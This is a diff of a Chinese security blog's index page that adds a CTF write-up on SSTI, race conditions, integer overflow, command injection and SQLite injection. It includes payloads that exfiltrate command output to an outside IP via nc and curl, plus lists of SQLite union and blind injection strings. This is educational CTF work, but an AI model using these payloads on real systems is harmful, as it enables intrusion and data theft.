@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <title>Iuhrey的幻想乡</title>
@@ -19,7 +19,7 @@
     <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
   
   
-    <link rel="icon" href="source/images/favicon.ico" />
+    <link rel="icon" href="source/images/favicon.ico">
   
   
     <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
@@ -29,7 +29,7 @@
   
 
 </head>
-
+</html>
 <body>
   <div id="container">
     <div id="wrap">
@@ -41,7 +41,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>25</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
@@ -69,11 +69,105 @@
 
         <section id="main">
   
-    <article id="post-关于命令执行的学习" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-近期比赛学习总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/15/近期比赛学习总结/" class="article-date">
+  <time class="post-time" datetime="2018-10-15T10:22:35.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/15/近期比赛学习总结/">近期比赛学习总结</a>
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>最近又陷入了自闭自闭又自闭的环节，先是pico高中生比赛被吊打，接着又是inctf被吊打，周末又被护网杯题目弄自闭，对此只能说自己技术太菜，总结一下最近新学到的知识点吧（由于比赛打完之后环境关了，所以只能结合大师傅们的wp进行复现）。  </p>
+<h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h2><p>这是护网杯的签到题，说句实话一开始打就知道这一次比赛又是凶多吉少，点进去发现有三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p>
+<p>赛后梳理起来，提示真是太明显了，当然这是马后炮了，render()就说明了这里用了渲染，就可能存在ssti注入，果不其然在报错页面发现了msg这个参数，通过利用msg=4测试发现返回了4，也就是说明可以通过ssti注入得到数据。<br>接着是url构成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br></pre></td></tr></table></figure></p>
+<p>hint.txt提示签名的生成方式，以及flag.txt提示了/flllllllllllg也就是说我们只要读取这个文件夹就能得到flag，那现在问题就是通过ssti注入得到cookie_secret，通过测试发现了一个问题就是ssti注入过滤了很多东西，只能读取变量。<br>既然题目提示了easy tornado，那么我们可以查询源码找突破口，这部分直接搜索cookie发现了在handler.settings存放了cookie_secret，直接通过msg=读取出cookie_secret再通过hint中提示的签名方式生成/fllllllllg的签名读取出flag。<br>这道题目有两个点坑，导致我没做出来….一个就是报错界面了，之后一定要主要一些报错界面或者一些不太重要的界面，既然存在就有他的作用，接着第二个点就是没认真阅读tornado的源码，如果存在ssti注入那模板一定得认真阅读，特别是关于敏感信息的一些文件。  </p>
+<h2 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h2><p>这是一道关于条件竞争以及整数溢出的题目，一开始只有20块只能买4个辣条，通过开多线程跑出来发现自己花了20元买了7个辣条，接着在兑换的时候利用整数溢出漏洞买足够辣条通过兑换flag得到flag。  </p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争漏洞是一种服务器端的漏洞，是由于开发者设计应用程序并发处理时操作逻辑不合理而造成。当应用面临高并发的请求时未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。<br>在CTF中很容易出现这种漏洞，特别是在文件操作以及金额同步的情形下，例如上面这道题目，在购买辣条时，后端操作应该是先把辣条数+1，然后再扣除费用，当我们开多线程发送多条购买辣条的请求时，服务端同时处理多条请求，同步处理不当，很有可能导致一包辣条的钱购买了多包的情况，或者是在金额即将归零时购买了辣条导致金额为负值。<br>或者是在上传文件时，服务器先将文件储存再通过检测后缀名将黑名单的文件进行删除，这里可以在文件删除之前访问文件，从而执行文件中的命令，例如可以在文件中写入file_put_contents()再生成一个shell，或者是将文件名改成白名单的文件。</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>准确来说这并不是属于web方面的内容，但是web杂的很，结合啥的漏洞都可能出现，像之前接触到的sprintf()格式化漏洞，结合mysql就出了一道盲注题目，还有pwn方面的结合web就有了沙箱逃逸这个专题…..话不多说…<br>一般来说，整形变量有int，short，long等，但是很多程序员在使用typedef定义新整形变量时会随缘定义，这就导致一些程序在跨平台的兼容性很差，所以业界有了一个整形变量的标准。如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef signed char             int8_t;   </span><br><span class="line">typedef short int               int16_t;  </span><br><span class="line">typedef int                     int32_t;  </span><br><span class="line">typedef long int                int64_t;    </span><br><span class="line">typedef long long int           int64_t;  </span><br><span class="line">typedef unsigned char           uint8_t;  </span><br><span class="line">typedef unsigned short int      uint16_t;  </span><br><span class="line">typedef unsigned int            uint32_t;  </span><br><span class="line">typedef unsigned long int       uint64_t;  </span><br><span class="line">typedef unsigned long long int  uint64_t;</span><br></pre></td></tr></table></figure></p>
+<p>而在c中，这些整数储存占用字节如下:<br><img src="/images/19/1.png" alt=""><br>溢出的方式根据数据类型有两种不同的类型：<br>第一种上界溢出，比如short int这个类型，它储存的数据从-32678~32677，如果我们操作32677，让其加1，那它储存的数据块最后一位储存符号位的字节就被溢出的数据给更改了，也就是说直接变为了最小的-32678，如果根据算式来看就是<strong>32677+1=-32678</strong>，这种带符号位在web网页中不常见，常见的是unsigned类型，再比如说unsigned short int数据储存的范围是0~65535，要是对65535操作加1，也就变成了0，通过算式说明就是:<strong>65535+1=0</strong>，也就是说我如果在网页中购买大量商品，后台数据处理出现整数溢出，那我们就能花1件的钱来购买65537件商品。<br>第二种为下界溢出，就类似上界溢出的逆运算，利用点和上界溢出一样，就粗略带过了…</p>
+<h2 id="Fancy-alive-monitoring"><a href="#Fancy-alive-monitoring" class="headerlink" title="Fancy-alive-monitoring"></a>Fancy-alive-monitoring</h2><p>直接上源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Monitoring Tool&lt;/title&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">	function check()&#123;</span><br><span class="line">		ip = document.getElementById(&quot;ip&quot;).value;</span><br><span class="line">		chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br><span class="line">		if (!chk) &#123;</span><br><span class="line">			alert(&quot;Wrong IP format.&quot;);</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			document.getElementById(&quot;monitor&quot;).submit();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Monitoring Tool ver 0.1&lt;/h1&gt;</span><br><span class="line">	&lt;form id=&quot;monitor&quot; action=&quot;index.php&quot; method=&quot;post&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">	&lt;p&gt; Input IP address of the target host</span><br><span class="line">	&lt;input id=&quot;ip&quot; name=&quot;ip&quot; type=&quot;text&quot;&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; value=&quot;Go!&quot; onclick=&quot;check()&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$ip = $_POST[&quot;ip&quot;];</span><br><span class="line">if ($ip) &#123;</span><br><span class="line">	// super fancy regex check!</span><br><span class="line">	if (preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip)) &#123;</span><br><span class="line">		exec(&apos;ping -c 1 &apos;.$ip, $cmd_result);</span><br><span class="line">		foreach($cmd_result as $str)&#123;</span><br><span class="line">			if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Wrong IP Format.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=&quot;index.txt&quot;&gt;index.php source code&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>题目主要是考源码审计以及命令执行，题目在客户端和服务端分别对ip进行了检测，第一次在客户端的检测如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chk = ip.match(/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$/);</span><br></pre></td></tr></table></figure></p>
+<p>这里明显只能匹配xxx.xxx.xxx.xxx格式的ip，但是可以很简单的通过burp抓包绕过，接着看服务端的检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/^(([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]).)&#123;3&#125;([1-9]?[0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])/&apos;,$ip</span><br></pre></td></tr></table></figure></p>
+<p>这里并没有使用$限制输入ip的结束，也就是说我们只要满足前面的ip匹配即可，接着使用命令分隔符就能执行我们命令了，但是源码中并没有回显，只有这一部分回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($str, &apos;100% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125; else if (strpos($str, &apos;, 0% packet loss&apos;) !== false)&#123;</span><br><span class="line">				printf(&quot;&lt;h3&gt;Target is alive.&lt;/h3&gt;&quot;);</span><br><span class="line">				break;</span><br></pre></td></tr></table></figure></p>
+<p>那也就是说，我们得通过其他方式来获取回显的信息。这里提供两种方式。</p>
+<h3 id="netcat监听"><a href="#netcat监听" class="headerlink" title="netcat监听"></a>netcat监听</h3><p>第一种方式就是在我们的服务器上开启一个监听端口，然后在目标机上通过nc链接，把执行的命令返回给我们的服务器。<br>首先我们开启一个端口，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure></p>
+<p>接着使用目标机执行ls命令然后发给我们的服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;ls | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
+<p>我们的服务器就收到了回显：<br><img src="/images/19/2.png" alt=""><br>接着通过读取flag文件就好了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;cat the-secret-1755-flag.txt | nc 66.42.72.66 2333</span><br></pre></td></tr></table></figure></p>
+<p>得到flag：picoCTF{n3v3r_trust_a_b0x_36d4a875}</p>
+<h3 id="带flag访问接收器"><a href="#带flag访问接收器" class="headerlink" title="带flag访问接收器"></a>带flag访问接收器</h3><p>第二种方式是通过带flag直接访问我们的服务器，把执行命令返回的内容通过赋值到一个变量然后访问我们的服务器，例如使用curl 或者是 wget命令。例如我们可以构造这样一个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls`</span><br></pre></td></tr></table></figure></p>
+<p>接着我们查看日志，发现:<br><img src="/images/19/3.png" alt=""><br>我们只得到了一个文件，那就是index.php，结合使用netcat监听方法发现这是第一个文件，这是因为在/的后面只能带一个参数，所以在不清楚有多少文件的情况下，我们是没办法用倒叙或者一个一个查的，因此我们可以使用base64，把结果进行编码构成一个参数进行访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;curl http://66.42.72.66/`ls | base64`</span><br></pre></td></tr></table></figure></p>
+<p>我们接收到了base64后的所有文件名:<br><img src="/images/19/4.png" alt=""><br>接着解码再读flag就行了。这也可以使用？带变量进行访问具体可以自己尝试。  </p>
+<h2 id="A-Simple-Question"><a href="#A-Simple-Question" class="headerlink" title="A Simple Question"></a>A Simple Question</h2><p>这是一道考sqlite注入的题目，sql注入中这一种倒是不太常见，但是和mysql有着类似的特点。<br>一进去就发现源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>简单审计发现，数据库会查询我们输入的答案，如果返回结果，那么会输出you are so close，但是如果搜索无果，那么就只会提示wrong，题目的主要思路就是通过注入的方式判断answer是什么，再通过输入answer得到flag。</p>
+<h3 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h3><p>sqlite注入和mysql注入差不多，就是语法存在一些差异。<br>这里以字符型为例子:  </p>
+<ul>
+<li>查询行数：’ order by x – -  </li>
+<li>查询回显位： ‘ union select 1,2,3,4,5….. – -</li>
+<li>查询表名： ‘ union select 1,group_concat(tbl_name),3,4,5… from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ – -</li>
+<li>查询列名： ‘ union select 1,group_concat(sql),3,4,5… from sqlite_master where type!=’meta’ and sql not null and name not like ‘sqlite_%’ and table=’表名’ – -</li>
+<li>查询字符串： ‘ union select 1,列名,3,4,5… from 表名 – -</li>
+</ul>
+<p>接下来就是sqlite的布尔型注入:</p>
+<ul>
+<li>查询表的数量：’ and ( (select count(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ ) = x) – -</li>
+<li>查询表名长度： ‘ and ((select length(tbl_name) from sqlite_master where type=’table’ and tbl_name not like ‘sqlite_%’ limit 0 offset 1) = x) – -</li>
+<li>查询表名：’ and ( (SELECT hex(substr(tbl_name,’猜解的字符位置’,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 0) = hex(‘a’) ) – -</li>
+<li>查询列名： ‘ and ((select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,’(‘)%2b1)),instr((substr(sql,instr(sql,’(‘)%2b1)),’<code>&#39;)),&quot;TEXT&quot;,&#39;&#39;),&quot;INTEGER&quot;,&#39;&#39;),&quot;AUTOINCREMENT&quot;,&#39;&#39;),&quot;PRIMARY KEY&quot;,&#39;&#39;),&quot;UNIQUE&quot;,&#39;&#39;),&quot;NUMERIC&quot;,&#39;&#39;),&quot;REAL&quot;,&#39;&#39;),&quot;BLOB&quot;,&#39;&#39;),&quot;NOT NULL&quot;,&#39;&#39;),&quot;,&quot;,&#39;~~&#39;),&quot;</code>“,””),’猜解的字符位置’,1)) FROM sqlite_master WHERE type!=’meta’ AND sql NOT NULL AND name NOT LIKE ‘sqlite_%’ and name=’表名’) = hex(‘a’) ) – -</li>
+<li>查询字符串： ‘ and ( (select hex(substr(列名),1,1)) from users limit 1 offset 0) = hex(‘a’) ) – -</li>
+</ul>
+<p>这些操作也不用死记住，理解查询的语法就差不多了，复杂的到时写脚本直接套就行了。</p>
+<p>参考链接：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/" target="_blank" rel="noopener">整数溢出原理介绍</a><br><a href="https://blog.csdn.net/Mary19920410/article/details/71518130?locationNum=4&amp;fps=1" target="_blank" rel="noopener">浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t</a><br><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018护网杯-web-writeup</a><br><a href="https://blog.csdn.net/qq_32400847/article/details/58756980" target="_blank" rel="noopener"><br>基于SQLite数据库的Web应用程序注入指南</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjnbrwl8f0017cwve6fvhngbz" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-关于命令执行的学习" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/10/08/关于命令执行的学习/" class="article-date">
   <time class="post-time" datetime="2018-10-08T11:33:09.000Z" itemprop="datePublished">
-    <span class="post-month">10月</span><br/>
+    <span class="post-month">10月</span><br>
     <span class="post-day">08</span>
   </time>
 </a>
@@ -119,7 +213,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjn3ccghb001dbkve9wk96ywn" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjnbrwl8b0014cwventdngwlr" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
@@ -133,11 +227,11 @@
 
 
   
-    <article id="post-绕过过滤getshell的一些骚操作" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-绕过过滤getshell的一些骚操作" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/09/27/绕过过滤getshell的一些骚操作/" class="article-date">
   <time class="post-time" datetime="2018-09-27T07:58:05.000Z" itemprop="datePublished">
-    <span class="post-month">9月</span><br/>
+    <span class="post-month">9月</span><br>
     <span class="post-day">27</span>
   </time>
 </a>
@@ -194,7 +288,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjn3ccght001pbkve9xt9052c" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjnbrwlcl0027cwvezqtis0rk" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>
@@ -208,11 +302,11 @@
 
 
   
-    <article id="post-solve-me-后续" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-solve-me-后续" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/08/16/solve-me-后续/" class="article-date">
   <time class="post-time" datetime="2018-08-16T04:21:27.000Z" itemprop="datePublished">
-    <span class="post-month">8月</span><br/>
+    <span class="post-month">8月</span><br>
     <span class="post-day">16</span>
   </time>
 </a>
@@ -258,7 +352,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjn3ccghm001jbkve74tp9bog" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjnbrwl8p001fcwve7nu94jkh" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -272,11 +366,11 @@
 
 
   
-    <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/08/02/关于代码审计的一些绕过方式/" class="article-date">
   <time class="post-time" datetime="2018-08-02T10:29:37.000Z" itemprop="datePublished">
-    <span class="post-month">8月</span><br/>
+    <span class="post-month">8月</span><br>
     <span class="post-day">02</span>
   </time>
 </a>
@@ -331,7 +425,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjn3ccghf001fbkve9p8jqi32" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjnbrwl8t001icwveb1x0cjs5" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -345,11 +439,11 @@
 
 
   
-    <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/07/22/近期比赛学习到的一些知识/" class="article-date">
   <time class="post-time" datetime="2018-07-22T01:33:46.000Z" itemprop="datePublished">
-    <span class="post-month">7月</span><br/>
+    <span class="post-month">7月</span><br>
     <span class="post-day">22</span>
   </time>
 </a>
@@ -390,7 +484,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjn3ccghx001sbkvech5r9kol" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjnbrwlci0025cwveqxsm3p6u" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -404,11 +498,11 @@
 
 
   
-    <article id="post-一次靶场的注入实战" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-一次靶场的注入实战" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/07/15/一次靶场的注入实战/" class="article-date">
   <time class="post-time" datetime="2018-07-15T00:48:35.000Z" itemprop="datePublished">
-    <span class="post-month">7月</span><br/>
+    <span class="post-month">7月</span><br>
     <span class="post-day">15</span>
   </time>
 </a>
@@ -457,7 +551,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjn3ccggt0013bkve43ns3rl8" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjnbrwl8x001lcwvespm2qrs1" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -471,11 +565,11 @@
 
 
   
-    <article id="post-xss挑战赛的Payload-下" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss挑战赛的Payload-下" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/07/13/xss挑战赛的Payload-下/" class="article-date">
   <time class="post-time" datetime="2018-07-12T18:33:05.000Z" itemprop="datePublished">
-    <span class="post-month">7月</span><br/>
+    <span class="post-month">7月</span><br>
     <span class="post-day">13</span>
   </time>
 </a>
@@ -524,7 +618,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjn3ccgg8000sbkvec6u2xbxh" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjnbrwl860011cwvev1w6jeme" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
